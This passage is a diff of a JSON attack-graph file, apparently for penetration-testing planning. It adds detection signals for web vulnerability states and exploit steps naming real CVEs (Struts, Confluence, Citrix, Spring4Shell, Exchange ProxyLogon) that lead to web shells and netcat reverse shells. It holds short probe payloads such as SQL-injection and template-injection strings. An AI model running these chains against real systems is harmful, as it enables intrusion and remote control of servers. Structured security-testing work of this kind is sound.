       "state_id": "sqli_after_step3",
@@ -1499,7 +2799,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "sqli"
+      "playbook_ref": "sqli",
+      "detection_signals": [
+        {
+          "signal_type": "tool_output",
+          "description": "Consistent, controllable behavior change tied to injected logic"
+        }
+      ]
     },
     {
       "state_id": "sqli_after_step4",
@@ -1509,7 +2815,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "sqli"
+      "playbook_ref": "sqli",
+      "detection_signals": [
+        {
+          "signal_type": "tool_output",
+          "description": "Database name/version/table names extracted"
+        }
+      ]
     },
     {
       "state_id": "sqli_confirmed",
@@ -1519,7 +2831,17 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "sqli"
+      "playbook_ref": "sqli",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "Boolean-true/false or UNION-based payloads produce a consistent, controllable difference in response content/status/length.",
+          "examples": [
+            "`' OR '1'='1` vs `' OR '1'='2` produce different result sets or HTTP status codes",
+            "UNION SELECT payload returns injected marker values in the response"
+          ]
+        }
+      ]
     },
     {
       "state_id": "sqli_ruled_out",
@@ -1529,7 +2851,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "sqli"
+      "playbook_ref": "sqli",
+      "detection_signals": [
+        {
+          "signal_type": "manual_judgment",
+          "description": "Expected result absent across the attempted variations of this technique."
+        }
+      ]
     },
     {
       "state_id": "ssrf_after_step1",
@@ -1539,7 +2867,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "ssrf"
+      "playbook_ref": "ssrf",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "Feature list: webhooks, avatar-from-URL, PDF generation, link unfurling, etc."
+        }
+      ]
     },
     {
       "state_id": "ssrf_after_step2",
@@ -1549,7 +2883,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "ssrf"
+      "playbook_ref": "ssrf",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "Callback received, confirming the server made an outbound request"
+        }
+      ]
     },
     {
       "state_id": "ssrf_after_step3",
@@ -1559,7 +2899,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "ssrf"
+      "playbook_ref": "ssrf",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "Server returns content from 127.0.0.1, internal hostnames, or 169.254.169.254 metadata service"
+        }
+      ]
     },
     {
       "state_id": "ssrf_after_step4",
@@ -1569,7 +2915,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "ssrf"
+      "playbook_ref": "ssrf",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "Blocked host reachable via bypass technique"
+        }
+      ]
     },
     {
       "state_id": "ssrf_confirmed",
@@ -1579,7 +2931,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "ssrf"
+      "playbook_ref": "ssrf",
+      "detection_signals": [
+        {
+          "signal_type": "manual_judgment",
+          "description": "Cloud instance credentials or internal service data retrieved"
+        }
+      ]
     },
     {
       "state_id": "ssrf_ruled_out",
@@ -1589,7 +2947,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "ssrf"
+      "playbook_ref": "ssrf",
+      "detection_signals": [
+        {
+          "signal_type": "manual_judgment",
+          "description": "Expected result absent across the attempted variations of this technique."
+        }
+      ]
     },
     {
       "state_id": "ssti_after_step1",
@@ -1599,7 +2963,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "ssti"
+      "playbook_ref": "ssti",
+      "detection_signals": [
+        {
+          "signal_type": "manual_judgment",
+          "description": "Candidate templated output identified"
+        }
+      ]
     },
     {
       "state_id": "ssti_after_step2",
@@ -1609,7 +2979,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "ssti"
+      "playbook_ref": "ssti",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "Output shows '49' instead of the literal payload, confirming template evaluation"
+        }
+      ]
     },
     {
       "state_id": "ssti_after_step3",
@@ -1619,7 +2995,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "ssti"
+      "playbook_ref": "ssti",
+      "detection_signals": [
+        {
+          "signal_type": "tool_output",
+          "description": "Engine identified (Jinja2, Twig, FreeMarker, etc.)"
+        }
+      ]
     },
     {
       "state_id": "ssti_confirmed",
@@ -1629,7 +3011,16 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "ssti"
+      "playbook_ref": "ssti",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "A math expression payload is evaluated by the template engine rather than reflected literally.",
+          "examples": [
+            "input `${7*7}` or `{{7*7}}` renders as \"49\" in the response instead of the literal payload text"
+          ]
+        }
+      ]
     },
     {
       "state_id": "ssti_ruled_out",
@@ -1639,7 +3030,67 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "ssti"
+      "playbook_ref": "ssti",
+      "detection_signals": [
+        {
+          "signal_type": "manual_judgment",
+          "description": "Expected result absent across the attempted variations of this technique."
+        }
+      ]
+    },
+    {
+      "state_id": "struts_identified",
+      "description": "Target is fingerprinted as an Apache Struts 2 application (file upload / .action endpoints).",
+      "tier": "recon",
+      "value": "low",
+      "target_types": [
+        "web"
+      ],
+      "playbook_ref": null,
+      "technology": "Apache Struts 2",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "URLs use the .action extension, or a Struts-specific error page/stack trace is triggerable.",
+          "examples": [
+            "endpoint paths end in .action",
+            "malformed request triggers a Struts-branded exception page"
+          ]
+        }
+      ]
+    },
+    {
+      "state_id": "struts_jakarta_confirmed",
+      "description": "Apache Struts Jakarta Multipart parser RCE confirmed exploitable.",
+      "tier": "vulnerability_confirmed",
+      "value": "critical",
+      "target_types": [
+        "web"
+      ],
+      "playbook_ref": null,
+      "technology": "Apache Struts 2",
+      "cve_refs": [
+        "CVE-2017-5638"
+      ],
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "An OGNL payload in the Content-Type header of a multipart upload request is evaluated during exception handling.",
+          "examples": [
+            "response includes the output of an injected OS command, or an OOB callback fires"
+          ]
+        }
+      ]
+    },
+    {
+      "state_id": "struts_ruled_out",
+      "description": "The Struts Jakarta Multipart RCE exploit was not successful against this target.",
+      "tier": "ruled_out",
+      "value": "none",
+      "target_types": [
+        "web"
+      ],
+      "playbook_ref": null
     },
     {
       "state_id": "subdomain_takeover_after_step1",
@@ -1649,7 +3100,13 @@
       "target_types": [
         "network"
       ],
-      "playbook_ref": "subdomain_takeover"
+      "playbook_ref": "subdomain_takeover",
+      "detection_signals": [
+        {
+          "signal_type": "manual_judgment",
+          "description": "List of subdomains with CNAME targets pointing to third-party services"
+        }
+      ]
     },
     {
       "state_id": "subdomain_takeover_after_step2",
@@ -1659,7 +3116,13 @@
       "target_types": [
         "network"
       ],
-      "playbook_ref": "subdomain_takeover"
+      "playbook_ref": "subdomain_takeover",
+      "detection_signals": [
+        {
+          "signal_type": "manual_judgment",
+          "description": "HTTP response shows a provider's unclaimed-resource error page"
+        }
+      ]
     },
     {
       "state_id": "subdomain_takeover_after_step3",
@@ -1669,7 +3132,13 @@
       "target_types": [
         "network"
       ],
-      "playbook_ref": "subdomain_takeover"
+      "playbook_ref": "subdomain_takeover",
+      "detection_signals": [
+        {
+          "signal_type": "manual_judgment",
+          "description": "Service now resolves and is served from attacker-controlled content"
+        }
+      ]
     },
     {
       "state_id": "subdomain_takeover_confirmed",
@@ -1679,7 +3148,13 @@
       "target_types": [
         "network"
       ],
-      "playbook_ref": "subdomain_takeover"
+      "playbook_ref": "subdomain_takeover",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "Attacker-controlled page renders under the trusted domain"
+        }
+      ]
     },
     {
       "state_id": "subdomain_takeover_ruled_out",
@@ -1689,7 +3164,13 @@
       "target_types": [
         "network"
       ],
-      "playbook_ref": "subdomain_takeover"
+      "playbook_ref": "subdomain_takeover",
+      "detection_signals": [
+        {
+          "signal_type": "manual_judgment",
+          "description": "Expected result absent across the attempted variations of this technique."
+        }
+      ]
     },
     {
       "state_id": "trusted_origin_control_obtained",
@@ -1700,7 +3181,16 @@
         "network",
         "web"
       ],
-      "playbook_ref": null
+      "playbook_ref": null,
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "The subdomain resolves and serves attacker-uploaded content instead of the provider's \"not claimed\" page.",
+          "examples": [
+            "GET https://takenover.victim.com returns the attacker's own page content"
+          ]
+        }
+      ]
     },
     {
       "state_id": "unauthorized_privileged_action_possible",
@@ -1711,7 +3201,16 @@
         "web",
         "api"
       ],
-      "playbook_ref": null
+      "playbook_ref": null,
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "A single privileged endpoint/action succeeds from a low-privilege session, while general admin functionality remains inaccessible.",
+          "examples": [
+            "POST to a role-change endpoint returns 200 and the role visibly changes, but /admin/dashboard still 403s"
+          ]
+        }
+      ]
     },
     {
       "state_id": "unrestricted_file_upload_after_step1",
@@ -1721,7 +3220,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "unrestricted_file_upload"
+      "playbook_ref": "unrestricted_file_upload",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "Upload accepts certain extensions; validation method inferred from error messages"
+        }
+      ]
     },
     {
       "state_id": "unrestricted_file_upload_after_step2",
@@ -1731,7 +3236,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "unrestricted_file_upload"
+      "playbook_ref": "unrestricted_file_upload",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "Server accepts the disguised file"
+        }
+      ]
     },
     {
       "state_id": "unrestricted_file_upload_after_step3",
@@ -1741,7 +3252,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "unrestricted_file_upload"
+      "playbook_ref": "unrestricted_file_upload",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "Uploaded file is reachable via a predictable/guessable URL"
+        }
+      ]
     },
     {
       "state_id": "unrestricted_file_upload_confirmed",
@@ -1751,7 +3268,16 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "unrestricted_file_upload"
+      "playbook_ref": "unrestricted_file_upload",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "An uploaded script file is reachable at a predictable URL and executes when requested.",
+          "examples": [
+            "GET request to the uploaded file's guessed path returns the output of the embedded script rather than raw source or a 404"
+          ]
+        }
+      ]
     },
     {
       "state_id": "unrestricted_file_upload_ruled_out",
@@ -1761,7 +3287,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "unrestricted_file_upload"
+      "playbook_ref": "unrestricted_file_upload",
+      "detection_signals": [
+        {
+          "signal_type": "manual_judgment",
+          "description": "Expected result absent across the attempted variations of this technique."
+        }
+      ]
     },
     {
       "state_id": "valid_credentials_found",
@@ -1769,7 +3301,18 @@
       "tier": "capability",
       "value": "high",
       "target_types": [],
-      "playbook_ref": null
+      "playbook_ref": null,
+      "detection_signals": [
+        {
+          "signal_type": "tool_output",
+          "description": "A recovered secret matches a known credential/key format and is not yet validated against a live service.",
+          "examples": [
+            "string matching AKIA[0-9A-Z]{16} (AWS access key)",
+            "string matching a bcrypt/md5 hash next to a username column",
+            "a JSON blob containing \"password\" or \"api_key\" fields with plausible values"
+          ]
+        }
+      ]
     },
     {
       "state_id": "web_target_identified",
@@ -1779,7 +3322,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": null
+      "playbook_ref": null,
+      "detection_signals": [
+        {
+          "signal_type": "manual_judgment",
+          "description": "Target is confirmed in-scope and reachable (rules of engagement / scope document)."
+        }
+      ]
     },
     {
       "state_id": "xss_dom_after_step1",
@@ -1789,7 +3338,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "xss_dom"
+      "playbook_ref": "xss_dom",
+      "detection_signals": [
+        {
+          "signal_type": "manual_judgment",
+          "description": "List of sources the app reads on page load or event"
+        }
+      ]
     },
     {
       "state_id": "xss_dom_after_step2",
@@ -1799,7 +3354,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "xss_dom"
+      "playbook_ref": "xss_dom",
+      "detection_signals": [
+        {
+          "signal_type": "manual_judgment",
+          "description": "A source flows unsanitized into a sink"
+        }
+      ]
     },
     {
       "state_id": "xss_dom_after_step3",
@@ -1809,7 +3370,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "xss_dom"
+      "playbook_ref": "xss_dom",
+      "detection_signals": [
+        {
+          "signal_type": "manual_judgment",
+          "description": "Payload executes purely client-side, no server round-trip needed"
+        }
+      ]
     },
     {
       "state_id": "xss_dom_confirmed",
@@ -1819,7 +3386,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "xss_dom"
+      "playbook_ref": "xss_dom",
+      "detection_signals": [
+        {
+          "signal_type": "manual_judgment",
+          "description": "Execution occurs despite framework's default escaping, e.g. via dangerouslySetInnerHTML equivalents"
+        }
+      ]
     },
     {
       "state_id": "xss_dom_ruled_out",
@@ -1829,7 +3402,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "xss_dom"
+      "playbook_ref": "xss_dom",
+      "detection_signals": [
+        {
+          "signal_type": "manual_judgment",
+          "description": "Expected result absent across the attempted variations of this technique."
+        }
+      ]
     },
     {
       "state_id": "xss_reflected_after_step1",
@@ -1839,7 +3418,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "xss_reflected"
+      "playbook_ref": "xss_reflected",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "Input value appears unmodified in the HTML/JS/attribute context"
+        }
+      ]
     },
     {
       "state_id": "xss_reflected_after_step2",
@@ -1849,7 +3434,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "xss_reflected"
+      "playbook_ref": "xss_reflected",
+      "detection_signals": [
+        {
+          "signal_type": "manual_judgment",
+          "description": "Context dictates which payload shape will execute"
+        }
+      ]
     },
     {
       "state_id": "xss_reflected_after_step3",
@@ -1859,7 +3450,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "xss_reflected"
+      "playbook_ref": "xss_reflected",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "Special characters like < > \" ' pass through unescaped"
+        }
+      ]
     },
     {
       "state_id": "xss_reflected_after_step4",
@@ -1869,7 +3466,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "xss_reflected"
+      "playbook_ref": "xss_reflected",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "JavaScript executes in the victim's browser origin (e.g. alert/document.cookie access)"
+        }
+      ]
     },
     {
       "state_id": "xss_reflected_confirmed",
@@ -1879,7 +3482,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "xss_reflected"
+      "playbook_ref": "xss_reflected",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "Payload fires when a victim visits the crafted URL"
+        }
+      ]
     },
     {
       "state_id": "xss_reflected_ruled_out",
@@ -1889,7 +3498,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "xss_reflected"
+      "playbook_ref": "xss_reflected",
+      "detection_signals": [
+        {
+          "signal_type": "manual_judgment",
+          "description": "Expected result absent across the attempted variations of this technique."
+        }
+      ]
     },
     {
       "state_id": "xss_stored_after_step1",
@@ -1899,7 +3514,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "xss_stored"
+      "playbook_ref": "xss_stored",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "Stored value reappears on a different page/view/account"
+        }
+      ]
     },
     {
       "state_id": "xss_stored_after_step2",
@@ -1909,7 +3530,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "xss_stored"
+      "playbook_ref": "xss_stored",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "Canary is saved without modification"
+        }
+      ]
     },
     {
       "state_id": "xss_stored_after_step3",
@@ -1919,7 +3546,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "xss_stored"
+      "playbook_ref": "xss_stored",
+      "detection_signals": [
+        {
+          "signal_type": "manual_judgment",
+          "description": "Canary characters are not encoded when rendered"
+        }
+      ]
     },
     {
       "state_id": "xss_stored_after_step4",
@@ -1929,7 +3562,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "xss_stored"
+      "playbook_ref": "xss_stored",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "JavaScript executes for any user who views the content"
+        }
+      ]
     },
     {
       "state_id": "xss_stored_confirmed",
@@ -1939,7 +3578,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "xss_stored"
+      "playbook_ref": "xss_stored",
+      "detection_signals": [
+        {
+          "signal_type": "manual_judgment",
+          "description": "Determine if privileged users are affected, raising severity"
+        }
+      ]
     },
     {
       "state_id": "xss_stored_ruled_out",
@@ -1949,7 +3594,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "xss_stored"
+      "playbook_ref": "xss_stored",
+      "detection_signals": [
+        {
+          "signal_type": "manual_judgment",
+          "description": "Expected result absent across the attempted variations of this technique."
+        }
+      ]
     },
     {
       "state_id": "xxe_after_step1",
@@ -1959,7 +3610,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "xxe"
+      "playbook_ref": "xxe",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "XML-consuming endpoints identified"
+        }
+      ]
     },
     {
       "state_id": "xxe_after_step2",
@@ -1969,7 +3626,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "xxe"
+      "playbook_ref": "xxe",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "File content is reflected in the response, or an out-of-band callback fires"
+        }
+      ]
     },
     {
       "state_id": "xxe_after_step3",
@@ -1979,7 +3642,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "xxe"
+      "playbook_ref": "xxe",
+      "detection_signals": [
+        {
+          "signal_type": "manual_judgment",
+          "description": "Requested file content is exfiltrated via the OOB channel"
+        }
+      ]
     },
     {
       "state_id": "xxe_confirmed",
@@ -1989,7 +3658,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "xxe"
+      "playbook_ref": "xxe",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "Internal resource content retrieved through the entity expansion"
+        }
+      ]
     },
     {
       "state_id": "xxe_ruled_out",
@@ -1999,7 +3674,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "xxe"
+      "playbook_ref": "xxe",
+      "detection_signals": [
+        {
+          "signal_type": "manual_judgment",
+          "description": "Expected result absent across the attempted variations of this technique."
+        }
+      ]
     }
   ],
   "actions": [
@@ -2465,6 +4146,26 @@
       "is_bridge": true
     },
     {
+      "action_id": "bridge_citrix_adc_to_shell",
+      "from_state": "citrix_adc_rce_confirmed",
+      "action": "Access the triggered file to establish an interactive session.",
+      "technique": "shell stabilization",
+      "tools": [
+        "curl"
+      ],
+      "playbook_ref": null,
+      "outcomes": [
+        {
+          "outcome_id": "success",
+          "observation": "Executed file returns command output.",
+          "likelihood": "likely",
+          "to_state": "low_priv_shell_obtained",
+          "note": null
+        }
+      ],
+      "is_bridge": true
+    },
+    {
       "action_id": "bridge_clickjacking_to_privileged_action",
       "from_state": "clickjacking_confirmed",
       "action": "Chain the clickjacking UI-redress to trick a victim into performing a privileged action.",
@@ -2598,6 +4299,26 @@
           "likelihood": "possible",
           "to_state": "command_injection_confirmed",
           "note": "Try a bind shell or write a web shell to a served directory instead."
+        }
+      ],
+      "is_bridge": true
+    },
+    {
+      "action_id": "bridge_confluence_ognl_to_shell",
+      "from_state": "confluence_ognl_confirmed",
+      "action": "Use the OGNL RCE to establish an interactive or reverse shell.",
+      "technique": "shell stabilization",
+      "tools": [
+        "netcat"
+      ],
+      "playbook_ref": null,
+      "outcomes": [
+        {
+          "outcome_id": "success",
+          "observation": "Reverse/bind shell connects successfully.",
+          "likelihood": "likely",
+          "to_state": "low_priv_shell_obtained",
+          "note": null
         }
       ],
       "is_bridge": true
@@ -2768,6 +4489,27 @@
       "is_bridge": true
     },
     {
+      "action_id": "bridge_exchange_to_shell",
+      "from_state": "exchange_rce_confirmed",
+      "action": "Access the dropped web shell to establish an interactive session.",
+      "technique": "shell stabilization",
+      "tools": [
+        "curl",
+        "browser"
+      ],
+      "playbook_ref": null,
+      "outcomes": [
+        {
+          "outcome_id": "success",
+          "observation": "Web shell responds and executes commands.",
+          "likelihood": "likely",
+          "to_state": "low_priv_shell_obtained",
+          "note": null
+        }
+      ],
+      "is_bridge": true
+    },
+    {
       "action_id": "bridge_file_read_to_creds",
       "from_state": "arbitrary_file_read_obtained",
       "action": "Search retrieved files for credentials, secrets, or API keys.",
@@ -2819,6 +4561,26 @@
           "likelihood": "possible",
           "to_state": "unrestricted_file_upload_confirmed",
           "note": "Retry with a different storage path guess or extension bypass."
+        }
+      ],
+      "is_bridge": true
+    },
+    {
+      "action_id": "bridge_gitlab_exiftool_to_shell",
+      "from_state": "gitlab_exiftool_confirmed",
+      "action": "Use the ExifTool RCE to establish an interactive or reverse shell.",
+      "technique": "shell stabilization",
+      "tools": [
+        "netcat"
+      ],
+      "playbook_ref": null,
+      "outcomes": [
+        {
+          "outcome_id": "success",
+          "observation": "Reverse/bind shell connects successfully.",
+          "likelihood": "likely",
+          "to_state": "low_priv_shell_obtained",
+          "note": null
         }
       ],
       "is_bridge": true
@@ -2926,6 +4688,47 @@
           "observation": "Forged token accepted but privilege claim is not honored server-side.",
           "likelihood": "possible",
           "to_state": "jwt_vulnerabilities_confirmed",
+          "note": null
+        }
+      ],
+      "is_bridge": true
+    },
+    {
+      "action_id": "bridge_laravel_ignition_to_shell",
+      "from_state": "laravel_ignition_confirmed",
+      "action": "Access the written PHP web shell to establish an interactive session.",
+      "technique": "shell stabilization",
+      "tools": [
+        "curl",
+        "browser"
+      ],
+      "playbook_ref": null,
+      "outcomes": [
+        {
+          "outcome_id": "success",
+          "observation": "Web shell responds and executes commands.",
+          "likelihood": "likely",
+          "to_state": "low_priv_shell_obtained",
+          "note": null
+        }
+      ],
+      "is_bridge": true
+    },
+    {
+      "action_id": "bridge_log4j_to_shell",
+      "from_state": "log4j_jndi_rce_confirmed",
+      "action": "Use the loaded malicious class to establish an interactive or reverse shell.",
+      "technique": "shell stabilization",
+      "tools": [
+        "netcat"
+      ],
+      "playbook_ref": null,
+      "outcomes": [
+        {
+          "outcome_id": "success",
+          "observation": "Reverse/bind shell connects successfully.",
+          "likelihood": "likely",
+          "to_state": "low_priv_shell_obtained",
           "note": null
         }
       ],
@@ -3287,6 +5090,27 @@
       "is_bridge": true
     },
     {
+      "action_id": "bridge_spring4shell_to_shell",
+      "from_state": "spring4shell_confirmed",
+      "action": "Access the written web shell to establish an interactive session.",
+      "technique": "shell stabilization",
+      "tools": [
+        "curl",
+        "browser"
+      ],
+      "playbook_ref": null,
+      "outcomes": [
+        {
+          "outcome_id": "success",
+          "observation": "Web shell responds and executes commands.",
+          "likelihood": "likely",
+          "to_state": "low_priv_shell_obtained",
+          "note": null
+        }
+      ],
+      "is_bridge": true
+    },
+    {
       "action_id": "bridge_sqli_to_creds",
       "from_state": "sqli_confirmed",
       "action": "Extract database contents via the confirmed injection and search for stored credentials or session tokens.",
@@ -3364,6 +5188,26 @@
           "likelihood": "possible",
           "to_state": "ssti_confirmed",
           "note": "Try a bind shell instead of a reverse shell."
+        }
+      ],
+      "is_bridge": true
+    },
+    {
+      "action_id": "bridge_struts_jakarta_to_shell",
+      "from_state": "struts_jakarta_confirmed",
+      "action": "Use the OGNL RCE to establish an interactive or reverse shell.",
+      "technique": "shell stabilization",
+      "tools": [
+        "netcat"
+      ],
+      "playbook_ref": null,
+      "outcomes": [
+        {
+          "outcome_id": "success",
+          "observation": "Reverse/bind shell connects successfully.",
+          "likelihood": "likely",
+          "to_state": "low_priv_shell_obtained",
+          "note": null
         }
       ],
       "is_bridge": true
@@ -4431,6 +6275,271 @@
       ]
     },
     {
+      "action_id": "exploit_citrix_adc",
+      "from_state": "citrix_adc_identified",
+      "action": "Send a crafted directory-traversal request (CVE-2019-19781) to write a malicious template file, then trigger it for execution.",
+      "technique": "directory traversal to RCE",
+      "tools": [
+        "curl",
+        "public PoC scripts"
+      ],
+      "playbook_ref": null,
+      "outcomes": [
+        {
+          "outcome_id": "success",
+          "observation": "Triggered file executes injected command.",
+          "likelihood": "possible",
+          "to_state": "citrix_adc_rce_confirmed",
+          "note": null
+        },
+        {
+          "outcome_id": "failure",
+          "observation": "Traversal blocked -- version is patched.",
+          "likelihood": "likely",
+          "to_state": "citrix_adc_ruled_out",
+          "note": null
+        }
+      ],
+      "is_bridge": true
+    },
+    {
+      "action_id": "exploit_confluence_ognl",
+      "from_state": "confluence_identified",
+      "action": "Send a crafted URL-path OGNL injection payload (CVE-2022-26134) to achieve code execution.",
+      "technique": "OGNL injection",
+      "tools": [
+        "curl",
+        "public PoC scripts"
+      ],
+      "playbook_ref": null,
+      "outcomes": [
+        {
+          "outcome_id": "success",
+          "observation": "Injected command output returned or OOB callback fires.",
+          "likelihood": "possible",
+          "to_state": "confluence_ognl_confirmed",
+          "note": null
+        },
+        {
+          "outcome_id": "failure",
+          "observation": "Payload rejected -- version is patched.",
+          "likelihood": "likely",
+          "to_state": "confluence_ruled_out",
+          "note": null
+        }
+      ],
+      "is_bridge": true
+    },
+    {
+      "action_id": "exploit_exchange_chain",
+      "from_state": "exchange_identified",
+      "action": "Run the SSRF-to-authentication-bypass-to-arbitrary-file-write exploit chain (ProxyLogon/ProxyShell family) to drop a web shell.",
+      "technique": "multi-CVE SSRF+auth-bypass+file-write chain",
+      "tools": [
+        "public PoC scripts"
+      ],
+      "playbook_ref": null,
+      "outcomes": [
+        {
+          "outcome_id": "success",
+          "observation": "Web shell written and reachable via OWA-relative path.",
+          "likelihood": "possible",
+          "to_state": "exchange_rce_confirmed",
+          "note": null
+        },
+        {
+          "outcome_id": "failure",
+          "observation": "Chain fails at the SSRF/auth-bypass stage -- version is patched.",
+          "likelihood": "likely",
+          "to_state": "exchange_ruled_out",
+          "note": null
+        }
+      ],
+      "is_bridge": true
+    },
+    {
+      "action_id": "exploit_gitlab_exiftool",
+      "from_state": "gitlab_identified",
+      "action": "Upload a crafted image file abusing ExifTool's DjVu parser (CVE-2021-22205) to achieve code execution.",
+      "technique": "file-parser RCE",
+      "tools": [
+        "public PoC scripts"
+      ],
+      "playbook_ref": null,
+      "outcomes": [
+        {
+          "outcome_id": "success",
+          "observation": "OOB callback fires after upload processing.",
+          "likelihood": "possible",
+          "to_state": "gitlab_exiftool_confirmed",
+          "note": null
+        },
+        {
+          "outcome_id": "failure",
+          "observation": "Upload processed without triggering the vulnerable code path -- likely patched.",
+          "likelihood": "likely",
+          "to_state": "gitlab_ruled_out",
+          "note": null
+        }
+      ],
+      "is_bridge": true
+    },
+    {
+      "action_id": "exploit_laravel_ignition",
+      "from_state": "laravel_debug_identified",
+      "action": "Send a crafted request abusing Ignition's debug-mode file read/write (CVE-2021-3129) to write and execute a malicious PHP file.",
+      "technique": "debug-mode file write RCE",
+      "tools": [
+        "curl",
+        "public PoC scripts"
+      ],
+      "playbook_ref": null,
+      "outcomes": [
+        {
+          "outcome_id": "success",
+          "observation": "Written file executes injected PHP code.",
+          "likelihood": "possible",
+          "to_state": "laravel_ignition_confirmed",
+          "note": null
+        },
+        {
+          "outcome_id": "failure",
+          "observation": "Debug mode is disabled or Ignition is patched.",
+          "likelihood": "likely",
+          "to_state": "laravel_ruled_out",
+          "note": null
+        }
+      ],
+      "is_bridge": true
+    },
+    {
+      "action_id": "exploit_spring4shell",
+      "from_state": "spring_mvc_identified",
+      "action": "Send a crafted class-loader data-binding payload (CVE-2022-22965) to overwrite the Tomcat access log with a JSP web shell.",
+      "technique": "Spring4Shell exploitation",
+      "tools": [
+        "curl",
+        "public PoC scripts"
+      ],
+      "playbook_ref": null,
+      "outcomes": [
+        {
+          "outcome_id": "success",
+          "observation": "Web shell written and reachable.",
+          "likelihood": "possible",
+          "to_state": "spring4shell_confirmed",
+          "note": null
+        },
+        {
+          "outcome_id": "failure",
+          "observation": "Payload rejected -- likely patched, not a WAR/Tomcat deployment, or JDK < 9.",
+          "likelihood": "likely",
+          "to_state": "spring_mvc_ruled_out",
+          "note": null
+        }
+      ],
+      "is_bridge": true
+    },
+    {
+      "action_id": "exploit_struts_jakarta",
+      "from_state": "struts_identified",
+      "action": "Send a multipart file-upload request with an OGNL payload in the Content-Type header (CVE-2017-5638).",
+      "technique": "Jakarta Multipart parser RCE",
+      "tools": [
+        "curl",
+        "public PoC scripts"
+      ],
+      "playbook_ref": null,
+      "outcomes": [
+        {
+          "outcome_id": "success",
+          "observation": "Injected command output returned or OOB callback fires.",
+          "likelihood": "possible",
+          "to_state": "struts_jakarta_confirmed",
+          "note": null
+        },
+        {
+          "outcome_id": "failure",
+          "observation": "Payload rejected -- version is patched.",
+          "likelihood": "likely",
+          "to_state": "struts_ruled_out",
+          "note": null
+        }
+      ],
+      "is_bridge": true
+    },
+    {
+      "action_id": "fingerprint_web_stack",
+      "from_state": "web_target_identified",
+      "action": "Fingerprint the technology stack (HTTP headers, error pages, default paths/ports, favicon hash).",
+      "technique": "technology fingerprinting",
+      "tools": [
+        "whatweb",
+        "wappalyzer",
+        "httpx"
+      ],
+      "playbook_ref": null,
+      "outcomes": [
+        {
+          "outcome_id": "spring",
+          "observation": "Spring Boot/MVC signatures detected.",
+          "likelihood": "rare",
+          "to_state": "spring_mvc_identified",
+          "note": null
+        },
+        {
+          "outcome_id": "confluence",
+          "observation": "Confluence signatures detected.",
+          "likelihood": "rare",
+          "to_state": "confluence_identified",
+          "note": null
+        },
+        {
